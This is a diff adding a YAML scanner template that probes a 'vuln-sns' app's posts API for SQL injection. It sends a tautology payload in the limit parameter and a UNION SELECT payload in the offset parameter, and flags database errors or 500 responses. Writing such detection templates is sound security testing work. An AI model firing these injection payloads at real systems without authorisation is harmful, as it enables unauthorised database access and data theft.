@@ -1,0 +1,55 @@
+id: vuln-sns-posts-get-sql-injection
+
+info:
+  name: vuln-sns Posts GET SQL Injection
+  author: devin
+  severity: high
+  description: SQL injection vulnerability in GET posts endpoint
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-89
+  metadata:
+    max-request: 2
+  tags: sqli,posts,get,vuln-sns
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/posts?limit=' OR '1'='1' -- "
+    
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "syntax error"
+          - "mysql"
+          - "SQL syntax"
+          - "near"
+        condition: or
+        part: body
+        case-insensitive: true
+      
+      - type: status
+        status:
+          - 500
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/posts?offset=1' UNION SELECT 1,2,3,4,5,6,7 -- "
+    
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "syntax error"
+          - "mysql"
+          - "union"
+          - "select"
+        condition: or
+        part: body
+        case-insensitive: true
+      
+      - type: status
+        status:
+          - 500
